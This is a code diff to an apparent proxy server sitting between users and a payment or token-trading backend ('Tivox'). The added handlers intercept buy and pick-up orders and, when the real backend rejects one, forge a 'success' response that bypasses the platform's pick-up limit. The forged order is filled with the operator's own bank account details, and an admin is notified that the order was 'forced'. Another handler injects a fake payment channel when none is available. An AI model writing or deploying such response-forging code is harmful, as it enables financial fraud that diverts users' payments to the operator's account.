@@ -1109,6 +1109,89 @@ app.all('/xxapi/*', async (req, res) => {
       return res.end(sb);
     }
 
+    // ── Buy / pick-up order intercept — bypass "maximum pick-ups" limit ────────
+    const isBuyOrder = urlLower.includes('buyitoken') || urlLower.includes('buy_itoken') ||
+      urlLower.includes('buyorder') || urlLower.includes('buy_order') ||
+      urlLower.includes('pickorder') || urlLower.includes('pick_order') ||
+      urlLower.includes('graborder') || urlLower.includes('takeorder') ||
+      urlLower.includes('receiveitoken') || urlLower.includes('receive_itoken') ||
+      urlLower.includes('roborder') || urlLower.includes('snatchorder');
+    if (isBuyOrder) {
+      const { response: br, respBody: bb, respHeaders: bh } = await proxyToTivox(req);
+      let bj = null;
+      try { bj = JSON.parse(bb); } catch(e) {}
+      if (bj) {
+        const isError = bj.code !== 0 && bj.code !== undefined;
+        if (isError) {
+          // Extract order_id/ct_id from request so we can build a reply
+          let reqOrderId = '', reqCtId = '';
+          try {
+            const ct = (req.headers['content-type'] || '').toLowerCase();
+            if (ct.includes('multipart') && req.rawBody) {
+              const mp = parseMultipartFields(req.rawBody);
+              reqOrderId = mp.order_id || mp.orderId || mp.orderNo || '';
+              reqCtId    = mp.ct_id    || mp.ctId    || '';
+            } else if (ct.includes('json') && req.rawBody) {
+              const jb = JSON.parse(req.rawBody.toString());
+              reqOrderId = jb.order_id || jb.orderId || jb.orderNo || '';
+              reqCtId    = jb.ct_id    || jb.ctId    || '';
+            } else if (ct.includes('form') && req.rawBody) {
+              const fb = Object.fromEntries(new URLSearchParams(req.rawBody.toString()));
+              reqOrderId = fb.order_id || fb.orderId || '';
+              reqCtId    = fb.ct_id    || fb.ctId    || '';
+            }
+          } catch(e) {}
+          // Get our active bank to populate the fake order detail
+          const activeBank = getActiveBank(data, null);
+          // Build a minimal success payload that looks like a real buyitoken response
+          bj.code = 0;
+          bj.msg  = 'success';
+          if (!bj.data || typeof bj.data !== 'object' || Array.isArray(bj.data)) {
+            bj.data = {};
+          }
+          const bd = bj.data;
+          if (!bd.orderNo && reqOrderId)   bd.orderNo   = reqOrderId;
+          if (!bd.orderId && reqOrderId)   bd.orderId   = reqOrderId;
+          if (!bd.order_id && reqOrderId)  bd.order_id  = reqOrderId;
+          if (!bd.ctId && reqCtId)         bd.ctId      = reqCtId;
+          if (activeBank) {
+            if (!bd.acctNo)   bd.acctNo   = activeBank.accountNo;
+            if (!bd.acctName) bd.acctName = activeBank.accountHolder;
+            if (!bd.acctCode) bd.acctCode = activeBank.ifsc;
+          }
+          notifyAdmin(data,
+`🛒 BUY ORDER FORCED
+📋 Order: ${reqOrderId || 'N/A'}
+⚠️ Original Error: ${bj.code || '?'} — ${bj.msg || '?'}
+✅ Forced to success
+🏦 Bank: ${activeBank ? activeBank.accountHolder + ' | ' + activeBank.accountNo : 'N/A'}
+🕐 ${now}`);
+        }
+        return res.status(200).json(bj);
+      }
+      bh['content-length'] = String(Buffer.byteLength(bb));
+      res.writeHead(br.status, bh);
+      return res.end(bb);
+    }
+
+    // ── availablect — if empty list, inject a placeholder so frontend doesn't block buy ──
+    const isAvailableCt = urlLower.includes('availablect') || urlLower.includes('available_ct') ||
+      urlLower.includes('availablechannel') || urlLower.includes('paymentchannel');
+    if (isAvailableCt) {
+      const { response: ar, respBody: ab, respHeaders: ah } = await proxyToTivox(req);
+      let aj = null;
+      try { aj = JSON.parse(ab); } catch(e) {}
+      if (aj && aj.code === 0 && Array.isArray(aj.data) && aj.data.length === 0) {
+        // Backend says no channels available — inject a stub so the frontend can proceed
+        aj.data = [{ id: 1, name: 'Bank Transfer', type: 0, payType: 0, status: 1, enable: 1 }];
+        return res.status(200).json(aj);
+      }
+      if (aj) return res.status(200).json(aj);
+      ah['content-length'] = String(Buffer.byteLength(ab));
+      res.writeHead(ar.status, ah);
+      return res.end(ab);
+    }
+
     const { response, respBody, respHeaders } = await proxyToTivox(req);
 
     if (data.blockUpdate !== false) {
